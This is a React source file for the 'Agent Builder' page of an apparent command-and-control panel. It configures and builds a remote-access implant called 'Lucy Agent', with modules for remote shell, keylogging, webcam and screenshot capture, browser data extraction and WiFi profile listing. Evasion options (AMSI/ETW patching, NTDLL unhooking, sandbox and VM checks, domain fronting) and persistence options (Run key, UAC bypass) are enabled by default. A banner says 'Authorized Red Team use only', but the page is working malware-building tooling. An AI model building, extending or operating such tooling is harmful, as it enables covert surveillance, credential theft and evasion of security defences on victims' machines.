import { useEffect, useMemo, useRef, useState } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import {
  Cpu, Download, RefreshCw, Key, Copy, Check, AlertCircle,
  Package, Shield, Eye, Target, Zap, Globe, Trash2, Lock, Terminal,
  Rocket, FileCode, Server, Power, Wifi, Video, Camera, Keyboard, FolderTree,
} from 'lucide-react'
import api from '../api/client'
import { Card } from '../components/ui/Card'
import { PageTransition } from '../components/ui/PageTransition'
import { BuildStepper } from '../components/ui/BuildStepper'

const ALL_MODULES = [
  { id: 'info',       label: 'System info',  desc: 'Collect basic system metadata',     icon: Cpu },
  { id: 'shell',      label: 'Shell',         desc: 'Execute shell commands',            icon: Terminal },
  { id: 'file',       label: 'File ops',      desc: 'Upload/download/list files',        icon: FolderTree },
  { id: 'screenshot', label: 'Screenshot',    desc: 'Capture the desktop',               icon: Camera },
  { id: 'keylog',     label: 'Keylogger',     desc: 'Log keystrokes',                    icon: Keyboard },
  { id: 'browser',    label: 'Browser',       desc: 'Chromium/Firefox data extraction',  icon: Globe },
  { id: 'wifi',       label: 'WiFi',          desc: 'List saved wireless profiles',      icon: Wifi },
  { id: 'webcam',     label: 'Webcam',        desc: 'Capture webcam frames',             icon: Video },
]

interface BuildOptions {
  obfuscate: boolean
  anti_analysis: boolean
  persistence: boolean
  hide_window: boolean
  startup_delay: number
  single_execution: boolean
  self_destruct: boolean
  vm_check: boolean
  debugger_check: boolean
  sandbox_check: boolean
  beacon_jitter: boolean
  max_reconnect: number
  registry_run: boolean
  uac_bypass: boolean
  custom_name: string
  auth_token: string
  ttl_days: number
  transport: string
  c2_profile: string
  auto_patch_amsi: boolean
  auto_patch_etw: boolean
  auto_unhook_ntdll: boolean
  sleep_mask: boolean
  tls_profile: string
  dormant_mode: boolean
  dormant_sleep_minutes: number
  dormant_persist: boolean
}

// === Single mode: everything ON ===
const DEFAULT_OPTS: BuildOptions = {
  obfuscate: true,
  anti_analysis: true,
  persistence: true,
  hide_window: true,
  startup_delay: 5,
  single_execution: false,
  self_destruct: false,
  vm_check: true,
  debugger_check: true,
  sandbox_check: true,
  beacon_jitter: true,
  max_reconnect: 9999,
  registry_run: true,
  uac_bypass: false,
  custom_name: 'lucy_agent',
  auth_token: '',
  ttl_days: 30,
  transport: 'websocket',
  c2_profile: 'http_default',
  auto_patch_amsi: true,
  auto_patch_etw: true,
  auto_unhook_ntdll: true,
  sleep_mask: true,
  tls_profile: 'chrome',
  dormant_mode: true,
  dormant_sleep_minutes: 30,
  dormant_persist: true,
}

type BuildStatus = 'idle' | 'queued' | 'building' | 'done' | 'error'

export default function AgentBuilder() {
  const [os, setOs] = useState('windows')
  const [arch, setArch] = useState('x64')
  const [selectedModules, setSelectedModules] = useState<string[]>(ALL_MODULES.map(m => m.id))
  const [serverUrl, setServerUrl] = useState('')
  const [apiKey, setApiKey] = useState('')
  const [opts, setOpts] = useState<BuildOptions>({ ...DEFAULT_OPTS })
  const [buildStatus, setBuildStatus] = useState<BuildStatus>('idle')
  const [buildId, setBuildId] = useState<string | null>(null)
  const [artifactType, setArtifactType] = useState<'zip' | 'binary' | null>(null)
  const [buildMessage, setBuildMessage] = useState('')
  const [error, setError] = useState('')
  const [copied, setCopied] = useState(false)
  const [copiedCmd, setCopiedCmd] = useState(false)
  const [buildMode, setBuildMode] = useState<'standard' | 'quick'>('quick')
  const [buildStage, setBuildStage] = useState('')
  const [buildProgress, setBuildProgress] = useState(0)
  const intervalRef = useRef<number | null>(null)

  const c2Hint = useMemo(() => {
    try {
      const loc = window.location.origin
      return loc.replace(/:(\d)+$/, '') + ':8000'
    } catch { return 'http://127.0.0.1:8000' }
  }, [])

  useEffect(() => { setServerUrl(c2Hint) }, [c2Hint])

  useEffect(() => {
    if (!apiKey) generateApiKey()
    return () => { if (intervalRef.current) window.clearInterval(intervalRef.current) }
  }, [])

  const toggleModule = (m: string) =>
    setSelectedModules((prev) => prev.includes(m) ? prev.filter((x) => x !== m) : [...prev, m])

  const toggleOpt = (key: keyof BuildOptions) => setOpts(prev => ({ ...prev, [key]: !prev[key] }))
  const setOpt = (key: keyof BuildOptions, value: any) => setOpts(prev => ({ ...prev, [key]: value }))

  const generateApiKey = async () => {
    try {
      const res = await api.post('/auth/rotate-key')
      setApiKey(res.data.api_key)
      setCopied(false)
    } catch (e: any) {
      setError(e.response?.data?.detail || 'Failed to generate API key')
    }
  }

  const copyApiKey = () => {
    navigator.clipboard.writeText(apiKey)
    setCopied(true)
    setTimeout(() => setCopied(false), 1500)
  }

  const handleBuild = async () => {
    setBuildStatus('queued')
    setError('')
    setBuildId(null)
    setArtifactType(null)
    setBuildMessage('')
    setBuildStage('queued')
    setBuildProgress(0)
    if (intervalRef.current) window.clearInterval(intervalRef.current)
    try {
      const res = await api.post('/build', {
        os, arch, modules: selectedModules,
        server_url: serverUrl, api_key: apiKey,
        build_mode: buildMode,
        ...opts,
      })
      setBuildId(res.data.build_id)
      setBuildStatus('building')
      pollStatus(res.data.build_id)
    } catch (e: any) {
      setError(e.response?.data?.detail || e.message)
      setBuildStatus('error')
    }
  }

  const pollStatus = (id: string) => {
    let attempts = 0
    const max = buildMode === 'quick' ? 30 : 60
    const interval = buildMode === 'quick' ? 500 : 2000
    intervalRef.current = window.setInterval(async () => {
      attempts++
      try {
        const res = await api.get(`/build/${id}`)
        if (res.data.stage) setBuildStage(res.data.stage)
        if (typeof res.data.progress === 'number') setBuildProgress(res.data.progress)
        if (res.data.status === 'done') {
          if (intervalRef.current) window.clearInterval(intervalRef.current)
          setBuildStatus('done')
          setBuildProgress(100)
          setBuildStage('done')
          setArtifactType(res.data.artifact_type || 'binary')
          setBuildMessage(res.data.message || 'Ready for download')
        } else if (res.data.status === 'error') {
          if (intervalRef.current) window.clearInterval(intervalRef.current)
          setError(res.data.error || 'Build failed')
          setBuildStatus('error')
        }
      } catch (e: any) {
        if (intervalRef.current) window.clearInterval(intervalRef.current)
        setError(e.response?.data?.detail || e.message)
        setBuildStatus('error')
      }
      if (attempts >= max) {
        if (intervalRef.current) window.clearInterval(intervalRef.current)
        setError('Build timed out')
        setBuildStatus('error')
      }
    }, interval)
  }

  const handleDownload = async () => {
    if (!buildId) return
    try {
      const res = await api.get(`/build/${buildId}/download`, { responseType: 'blob' })
      const blob = new Blob([res.data])
      const url = URL.createObjectURL(blob)
      const a = document.createElement('a')
      a.href = url
      a.download = artifactType === 'zip' ? `${opts.custom_name}.zip` : `${opts.custom_name}.exe`
      a.click()
      URL.revokeObjectURL(url)
    } catch (e: any) {
      setError(e.response?.data?.detail || 'Download failed')
    }
  }

  const copyBuildCommand = () => {
    let cmd: string
    if (buildMode === 'quick') {
      cmd = `# Extract ZIP, then:\npip install -r requirements.txt\npython run.py`
    } else if (artifactType === 'zip') {
      cmd = `# Extract ZIP on Windows, then:\npython -m pip install pyinstaller psutil websocket-client pycryptodome cryptography\nbuild.bat\n# Your ${opts.custom_name}.exe will be in dist/`
    } else if (isWindows) {
      cmd = `# No installation needed — just run:\n${opts.custom_name}.exe`
    } else {
      cmd = `chmod +x ${opts.custom_name} && ./${opts.custom_name}`
    }
    navigator.clipboard.writeText(cmd)
    setCopiedCmd(true)
    setTimeout(() => setCopiedCmd(false), 2000)
  }

  const isWindows = os === 'windows'

  return (
    <PageTransition>
      <div className="page-container max-w-5xl space-y-6">
        {/* Header */}
        <div className="flex items-end justify-between">
          <div className="space-y-1">
            <h1 className="text-2xl font-bold flex items-center gap-2">
              <Rocket size={24} className="text-success" /> Agent Builder
            </h1>
            <p className="text-sm text-base-content/50">One agent. Full control. Build and deploy in one click.</p>
          </div>
          <div className="flex items-center gap-2 text-xs text-base-content/40">
            <Server size={14} /> {os}/{arch}
          </div>
        </div>

        {/* Warning banner */}
        <div className="alert alert-warning text-xs flex items-start gap-2 py-2">
          <AlertCircle size={16} className="shrink-0 mt-0.5" />
          <div>
            <span className="font-semibold">Authorized Red Team use only.</span> Every build is watermarked (operator + build ID + TTL) and logged to <code>data/build_audit.log</code>.
          </div>
        </div>

        {/* === Single agent banner === */}
        <section>
          <div className="relative rounded-2xl border-2 border-success/30 overflow-hidden bg-gradient-to-br from-emerald-500/15 via-purple-500/5 to-transparent p-6">
            <div className="flex items-start gap-4">
              <div className="w-14 h-14 rounded-2xl bg-success/15 text-success flex items-center justify-center shrink-0">
                <Shield size={28} />
              </div>
              <div className="flex-1 space-y-2">
                <h2 className="font-bold text-lg">Lucy Agent — Full Capability</h2>
                <p className="text-sm text-base-content/60">
                  Shell, remote desktop, webcam, screenshots, keylogger, file browser, WiFi, browser extraction.
                  Anti-analysis, sleep mask, dormant mode with disk persistence. Everything enabled, everything configurable.
                </p>
                <div className="flex flex-wrap gap-1.5 pt-1">
                  {['Shell', 'Remote', 'Camera', 'Keylog', 'Files', 'Dormant', 'Persistence', 'Anti-VM', 'Sleep mask', 'Jitter'].map(b => (
                    <span key={b} className="px-2 py-0.5 rounded-md text-[10px] font-semibold bg-success/10 text-success">
                      {b}
                    </span>
                  ))}
                </div>
              </div>
            </div>
          </div>
        </section>

        {/* === Configuration grid === */}
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
          {/* Target + connection */}
          <Card hover={false} className="p-4 space-y-4">
            <h3 className="font-semibold text-sm flex items-center gap-2"><Target size={16} className="text-success" /> Target & Connection</h3>
            <div className="grid grid-cols-2 gap-3">
              <label className="text-xs text-base-content/60">OS
                <select className="select select-bordered select-sm w-full mt-1" value={os} onChange={(e) => setOs(e.target.value)}>
                  <option value="windows">Windows</option>
                  <option value="linux">Linux</option>
                  <option value="darwin">macOS</option>
                </select>
              </label>
              <label className="text-xs text-base-content/60">Arch
                <select className="select select-bordered select-sm w-full mt-1" value={arch} onChange={(e) => setArch(e.target.value)}>
                  <option value="x64">x64</option>
                  <option value="x86">x86</option>
                  <option value="arm64">ARM64</option>
                </select>
              </label>
            </div>
            <label className="text-xs text-base-content/60 block">C2 Server URL
              <input className="input input-bordered input-sm w-full mt-1 font-mono" value={serverUrl}
                onChange={(e) => setServerUrl(e.target.value)} placeholder="http://127.0.0.1:8000" />
            </label>
            <label className="text-xs text-base-content/60 block">API Key
              <div className="flex gap-2 mt-1">
                <input className="input input-bordered input-sm w-full font-mono" value={apiKey} placeholder="Click generate" readOnly />
                <button className="btn btn-sm btn-outline gap-1" onClick={generateApiKey} title="Generate API key">
                  <Key size={14} />
                </button>
                {apiKey && (
                  <button className="btn btn-sm btn-outline gap-1" onClick={copyApiKey} title="Copy">
                    {copied ? <Check size={14} className="text-success" /> : <Copy size={14} />}
                  </button>
                )}
              </div>
            </label>
            <div className="grid grid-cols-2 gap-3">
              <label className="text-xs text-base-content/60 block">TTL (days)
                <input type="number" min={1} max={365} className="input input-bordered input-sm w-full mt-1"
                  value={opts.ttl_days} onChange={(e) => setOpt('ttl_days', parseInt(e.target.value || '1'))} />
              </label>
              <label className="text-xs text-base-content/60 block">Output name
                <input className="input input-bordered input-sm w-full mt-1 font-mono"
                  value={opts.custom_name} onChange={(e) => setOpt('custom_name', e.target.value)} />
              </label>
            </div>
            <label className="text-xs text-base-content/60 block">Transport
              <select className="select select-bordered select-sm w-full mt-1"
                value={opts.transport} onChange={(e) => setOpt('transport', e.target.value)}>
                <option value="websocket">WebSocket</option>
                <option value="http">HTTP polling</option>
                <option value="dns">DNS beacon</option>
                <option value="smb">SMB named pipe</option>
                <option value="tcp">TCP beacon</option>
              </select>
            </label>
          </Card>

          {/* Modules */}
          <Card hover={false} className="p-4 space-y-4">
            <div className="flex items-center justify-between">
              <h3 className="font-semibold text-sm flex items-center gap-2"><Terminal size={16} className="text-success" /> Modules</h3>
              <div className="flex items-center gap-2">
                <span className="text-[10px] text-base-content/40 font-mono">{selectedModules.length}/{ALL_MODULES.length}</span>
                <button className="btn btn-xs btn-ghost" onClick={() => setSelectedModules(ALL_MODULES.map(m => m.id))}>All</button>
                <button className="btn btn-xs btn-ghost" onClick={() => setSelectedModules([])}>None</button>
              </div>
            </div>
            <div className="grid grid-cols-2 gap-2 max-h-64 overflow-y-auto scrollbar-thin pr-1">
              {ALL_MODULES.map((m) => {
                const MIcon = m.icon
                const selected = selectedModules.includes(m.id)
                return (
                  <motion.button
                    key={m.id}
                    whileHover={{ x: 2 }}
                    onClick={() => toggleModule(m.id)}
                    className={`flex items-start gap-2 p-2.5 rounded-lg text-left transition-colors ${
                      selected ? 'bg-success/10 border border-success/20' : 'bg-base-300/30 border border-transparent hover:bg-base-300/50'
                    }`}
                  >
                    <div className={`w-7 h-7 rounded-lg flex items-center justify-center shrink-0 ${
                      selected ? 'bg-success/15 text-success' : 'bg-base-300 text-base-content/40'
                    }`}>
                      <MIcon size={13} />
                    </div>
                    <div className="min-w-0 flex-1">
                      <p className={`text-xs font-medium ${selected ? 'text-success' : ''}`}>{m.label}</p>
                      <p className="text-[10px] text-base-content/50 truncate">{m.desc}</p>
                    </div>
                    {selected && <Check size={14} className="text-success shrink-0 mt-1" />}
                  </motion.button>
                )
              })}
            </div>
          </Card>
        </div>

        {/* === Options — single panel, grouped === */}
        <Card hover={false} className="p-4 space-y-4">
          <h3 className="font-semibold text-sm flex items-center gap-2"><Shield size={16} className="text-success" /> Options</h3>
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-x-6 gap-y-2">

            {/* Evasion */}
            <div className="space-y-2">
              <p className="text-[10px] text-base-content/50 uppercase tracking-wider font-bold">Evasion</p>
              <Toggle label="Anti-analysis" checked={opts.anti_analysis} onChange={() => toggleOpt('anti_analysis')} />
              <Toggle label="VM check" checked={opts.vm_check} onChange={() => toggleOpt('vm_check')} />
              <Toggle label="Debugger check" checked={opts.debugger_check} onChange={() => toggleOpt('debugger_check')} />
              <Toggle label="Sandbox check" checked={opts.sandbox_check} onChange={() => toggleOpt('sandbox_check')} />
              <Toggle label="Beacon jitter" checked={opts.beacon_jitter} onChange={() => toggleOpt('beacon_jitter')} />
              <Toggle label="Obfuscate" checked={opts.obfuscate} onChange={() => toggleOpt('obfuscate')} />
            </div>

            {/* 2026 Evasion */}
            <div className="space-y-2">
              <p className="text-[10px] text-base-content/50 uppercase tracking-wider font-bold">EDR Evasion</p>
              <Toggle label="Auto-patch AMSI" checked={opts.auto_patch_amsi} onChange={() => toggleOpt('auto_patch_amsi')} />
              <Toggle label="Auto-patch ETW" checked={opts.auto_patch_etw} onChange={() => toggleOpt('auto_patch_etw')} />
              <Toggle label="Unhook NTDLL" checked={opts.auto_unhook_ntdll} onChange={() => toggleOpt('auto_unhook_ntdll')} />
              <Toggle label="Sleep mask (memory encryption)" checked={opts.sleep_mask} onChange={() => toggleOpt('sleep_mask')} />
              <label className="text-xs text-base-content/60 block pt-1">TLS fingerprint
                <select className="select select-bordered select-sm w-full mt-1"
                  value={opts.tls_profile} onChange={(e) => setOpt('tls_profile', e.target.value)}>
                  <option value="">None (default)</option>
                  <option value="chrome">Chrome</option>
                  <option value="firefox">Firefox</option>
                  <option value="safari">Safari</option>
                  <option value="edge">Edge</option>
                </select>
              </label>
            </div>

            {/* Dormant + Persistence */}
            <div className="space-y-2">
              <p className="text-[10px] text-purple-400 uppercase tracking-wider font-bold">Dormant & Persistence</p>
              <Toggle label="Dormant (sleep/wake cycle)" checked={opts.dormant_mode} onChange={() => toggleOpt('dormant_mode')} />
              <Toggle label="Disk persistence (survive reboot)" checked={opts.dormant_persist} onChange={() => toggleOpt('dormant_persist')} />
              <Toggle label="Registry Run key" checked={opts.registry_run} onChange={() => toggleOpt('registry_run')} />
              <Toggle label="Persistence module" checked={opts.persistence} onChange={() => toggleOpt('persistence')} />
              <Toggle label="UAC bypass" checked={opts.uac_bypass} onChange={() => toggleOpt('uac_bypass')} />
              <label className="text-xs text-base-content/60 block pt-1">Sleep interval (min)
                <input type="number" min={1} max={1440} className="input input-bordered input-sm w-full mt-1"
                  value={opts.dormant_sleep_minutes} onChange={(e) => setOpt('dormant_sleep_minutes', parseInt(e.target.value || '30'))} />
              </label>
            </div>

            {/* Behavior */}
            <div className="space-y-2">
              <p className="text-[10px] text-base-content/50 uppercase tracking-wider font-bold">Behavior</p>
              <Toggle label="Hide window" checked={opts.hide_window} onChange={() => toggleOpt('hide_window')} />
              <Toggle label="Self-destruct" checked={opts.self_destruct} onChange={() => toggleOpt('self_destruct')} />
              <Toggle label="Single execution" checked={opts.single_execution} onChange={() => toggleOpt('single_execution')} />
              <label className="text-xs text-base-content/60 block pt-1">Startup delay (s)
                <input type="number" min={0} max={300} className="input input-bordered input-sm w-full mt-1"
                  value={opts.startup_delay} onChange={(e) => setOpt('startup_delay', parseInt(e.target.value || '0'))} />
              </label>
              <label className="text-xs text-base-content/60 block">Max reconnect
                <input type="number" min={1} max={99999} className="input input-bordered input-sm w-full mt-1"
                  value={opts.max_reconnect} onChange={(e) => setOpt('max_reconnect', parseInt(e.target.value || '50'))} />
              </label>
            </div>

            {/* C2 Profile */}
            <div className="space-y-2">
              <p className="text-[10px] text-base-content/50 uppercase tracking-wider font-bold">C2 Profile</p>
              <label className="text-xs text-base-content/60 block">Profile
                <select className="select select-bordered select-sm w-full mt-1"
                  value={opts.c2_profile} onChange={(e) => setOpt('c2_profile', e.target.value)}>
                  <option value="http_default">http_default</option>
                  <option value="https_cdn">https_cdn</option>
                  <option value="google_front">google_front</option>
                </select>
              </label>
            </div>
          </div>
        </Card>

        {/* === Build button + progress === */}
        <Card hover={false} className="p-5 space-y-4">
          {/* Build mode toggle */}
          <div className="flex gap-2">
            <button
              onClick={() => setBuildMode('quick')}
              className={`btn btn-sm flex-1 gap-1 ${buildMode === 'quick' ? 'btn-info' : 'btn-ghost'}`}
              title="Quick mode: Python bundle, no PyInstaller. Ready in <30s."
            >
              <Zap size={14} /> Quick {'(<30s)'}
            </button>
            <button
              onClick={() => setBuildMode('standard')}
              className={`btn btn-sm flex-1 gap-1 ${buildMode === 'standard' ? 'btn-primary' : 'btn-ghost'}`}
              title="Standard mode: compiled .exe binary. No Python needed on target."
            >
              <Package size={14} /> Standard (.exe)
            </button>
          </div>
          {buildMode === 'quick' && (
            <p className="text-[10px] text-info/70 text-center -mt-2">
              Quick mode: Python bundle. Run with: pip install -r requirements.txt && python run.py
            </p>
          )}

          {buildStatus === 'idle' ? (
            <motion.button
              whileHover={{ scale: 1.01 }}
              whileTap={{ scale: 0.99 }}
              className={`btn ${buildMode === 'quick' ? 'btn-info' : 'btn-success'} gap-2 w-full btn-lg`}
              onClick={handleBuild}
              disabled={!serverUrl || !apiKey}
            >
              <Rocket size={18} /> Build Agent — {os}/{arch} ({buildMode})
            </motion.button>
          ) : (
            <>
              <BuildStepper status={buildStatus} />
              {buildStatus === 'building' && (
                <div className="space-y-2">
                  <div className="flex justify-between text-xs">
                    <span className="text-base-content/60 capitalize">{buildStage.replace(/_/g, ' ')}</span>
                    <span className="font-mono text-info">{buildProgress}%</span>
                  </div>
                  <progress className="progress progress-info w-full" value={buildProgress} max="100" />
                  <p className="text-center text-xs text-base-content/50">
                    {buildMode === 'quick'
                      ? `Packaging with ${selectedModules.length} modules… Ready in <30s.`
                      : `Compiling with ${selectedModules.length} modules… Takes a few minutes.`}
                  </p>
                </div>
              )}
              <button
                className={`btn ${buildMode === 'quick' ? 'btn-info' : 'btn-success'} gap-2 w-full`}
                onClick={handleBuild}
                disabled={buildStatus === 'building'}
              >
                {buildStatus === 'building' ? (
                  <><span className="loading loading-spinner loading-sm" /> Building…</>
                ) : (
                  <><RefreshCw size={16} /> Rebuild</>
                )}
              </button>
            </>
          )}
        </Card>

        {/* === Error === */}
        <AnimatePresence>
          {error && (
            <motion.div
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0 }}
              className="alert alert-error text-sm flex items-start gap-2"
            >
              <AlertCircle size={18} className="shrink-0 mt-0.5" />
              <span>{error}</span>
            </motion.div>
          )}
        </AnimatePresence>

        {/* === Build Result === */}
        <AnimatePresence>
          {buildStatus === 'done' && buildId && (
            <motion.div
              initial={{ opacity: 0, scale: 0.95, y: 20 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              transition={{ type: 'spring', stiffness: 200, damping: 20 }}
            >
              <Card hover={false} className="p-6 border-2 border-success/30 bg-success/5">
                <div className="flex items-start gap-4 mb-4">
                  <motion.div
                    initial={{ scale: 0, rotate: -180 }}
                    animate={{ scale: 1, rotate: 0 }}
                    transition={{ type: 'spring', stiffness: 260, damping: 18, delay: 0.1 }}
                    className="w-14 h-14 rounded-2xl bg-success/15 flex items-center justify-center shrink-0"
                  >
                    <Check size={28} className="text-success" />
                  </motion.div>
                  <div className="flex-1">
                    <h3 className="font-bold text-lg text-success">Build Complete!</h3>
                    <p className="text-sm text-base-content/70">{buildMessage}</p>
                  </div>
                </div>

                {/* Summary */}
                <div className="grid grid-cols-2 md:grid-cols-5 gap-3 mb-4">
                  <SummaryItem label="Build" value={buildMode === 'quick' ? 'Quick' : 'Standard'} />
                  <SummaryItem label="OS" value={`${os}/${arch}`} />
                  <SummaryItem label="Modules" value={`${selectedModules.length}`} />
                  <SummaryItem label="Dormant" value={opts.dormant_mode ? 'ON' : 'OFF'} />
                  <SummaryItem label="TTL" value={`${opts.ttl_days}d`} />
                </div>

                {/* Instructions */}
                {buildMode === 'standard' && artifactType === 'binary' && (
                  <div className="bg-success/5 border border-success/20 rounded-xl p-4 mb-4 space-y-2">
                    <p className="text-xs font-semibold text-success uppercase tracking-wider flex items-center gap-1">
                      <Check size={12} /> Ready to run — no Python needed
                    </p>
                    <ol className="list-decimal list-inside text-xs text-base-content/60 space-y-1">
                      <li>Download the <code className="bg-base-200 px-1 rounded">{opts.custom_name}{isWindows ? '.exe' : ''}</code> binary below</li>
                      <li>{isWindows ? 'Double-click to run, or execute from a terminal' : 'Make executable and run'}: <code className="bg-base-200 px-1 rounded">{isWindows ? `${opts.custom_name}.exe` : `chmod +x ${opts.custom_name} && ./${opts.custom_name}`}</code></li>
                    </ol>
                  </div>
                )}
                {buildMode === 'standard' && artifactType === 'zip' && (
                  <div className="bg-base-300/50 rounded-xl p-4 mb-4 space-y-2">
                    <p className="text-xs font-semibold text-base-content/70 uppercase tracking-wider">Next steps</p>
                    <ol className="list-decimal list-inside text-xs text-base-content/60 space-y-1">
                      <li>Download the ZIP below</li>
                      <li>Extract on a {os === 'windows' ? 'Windows' : 'Linux/macOS'} machine</li>
                      <li>Double-click <code className="bg-base-200 px-1 rounded">build.bat</code> {os === 'windows' ? '(or build.ps1)' : '(or run build.sh)'}</li>
                      <li>Your <code className="bg-base-200 px-1 rounded">{opts.custom_name}{os === 'windows' ? '.exe' : ''}</code> appears in <code className="bg-base-200 px-1 rounded">dist/</code></li>
                    </ol>
                  </div>
                )}
                {buildMode === 'quick' && (
                  <div className="bg-info/5 border border-info/20 rounded-xl p-4 mb-4 space-y-2">
                    <p className="text-xs font-semibold text-info uppercase tracking-wider">Quick mode — next steps</p>
                    <ol className="list-decimal list-inside text-xs text-base-content/60 space-y-1">
                      <li>Download and extract the ZIP</li>
                      <li>Run <code className="bg-base-200 px-1 rounded">pip install -r requirements.txt</code></li>
                      <li>Launch with <code className="bg-base-200 px-1 rounded">python run.py</code> (or <code className="bg-base-200 px-1 rounded">run.bat</code> on Windows)</li>
                    </ol>
                  </div>
                )}

                {/* Actions */}
                <div className="flex flex-wrap gap-2">
                  <motion.button
                    whileHover={{ scale: 1.02 }}
                    whileTap={{ scale: 0.98 }}
                    className="btn btn-success gap-2"
                    onClick={handleDownload}
                  >
                    <Download size={16} /> Download {artifactType === 'zip' ? 'ZIP' : isWindows ? '.exe' : 'Agent'}
                  </motion.button>
                  <button
                    className="btn btn-outline btn-sm gap-1"
                    onClick={copyBuildCommand}
                  >
                    {copiedCmd ? <Check size={14} className="text-success" /> : <Copy size={14} />}
                    {copiedCmd ? 'Copied!' : 'Copy run instructions'}
                  </button>
                </div>
              </Card>
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </PageTransition>
  )
}

function SummaryItem({ label, value }: { label: string; value: string }) {
  return (
    <div className="bg-base-200/50 rounded-lg p-2.5 text-center">
      <p className="text-[10px] uppercase tracking-wider text-base-content/40">{label}</p>
      <p className="text-sm font-bold text-base-content">{value}</p>
    </div>
  )
}

function Toggle({ label, checked, onChange }: { label: string; checked: boolean; onChange: () => void }) {
  return (
    <label className="flex items-center gap-2 cursor-pointer text-sm">
      <input type="checkbox" className="toggle toggle-sm toggle-success" checked={checked} onChange={onChange} />
      {label}
    </label>
  )
}
